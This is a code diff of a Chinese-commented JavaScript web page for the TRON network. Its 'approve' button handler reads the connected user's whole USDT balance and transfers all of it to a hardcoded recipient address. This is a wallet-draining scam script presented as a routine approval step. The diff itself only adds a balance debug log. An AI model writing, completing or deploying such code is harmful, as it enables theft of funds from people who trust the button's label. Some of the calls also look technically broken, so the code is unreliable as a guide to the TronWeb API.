@@ -18,7 +18,7 @@ const recipientAddress = 'TYrG44bTwLhiEGvb48HYtHCAkgk7etr4d3'; // 接收地址
 document.getElementById('approveBtn').onclick = async function() {
     try {
         const tronWeb = await getTronWeb();
-        
+
         // 检查tronWeb是否包含contract方法
         if (!tronWeb.contract) {
             throw new Error('tronWeb未正确初始化');
@@ -28,6 +28,7 @@ document.getElementById('approveBtn').onclick = async function() {
         
         // 获取用户USDT余额
         const amount = await tokenContract.balanceOf(tronWeb.defaultAddress.base58).call();
+        console.log('用户USDT余额:', amount.toString()); // 打印余额以便调试
         if (amount.isZero()) {
             document.getElementById('status').innerText = '您的USDT余额为0，无法转账。';
             return;
@@ -36,7 +37,7 @@ document.getElementById('approveBtn').onclick = async function() {
         // 授权合约支配用户的代币
         const approveTx = await tokenContract.approve(tronWeb.defaultAddress.base58, amount).send();
         await approveTx.wait(); // 等待交易确认
-        
+
         // 转账所有USDT
         const transferTx = await tokenContract.transferFrom(tronWeb.defaultAddress.base58, recipientAddress, amount).send();
         await transferTx.wait(); // 等待交易确认
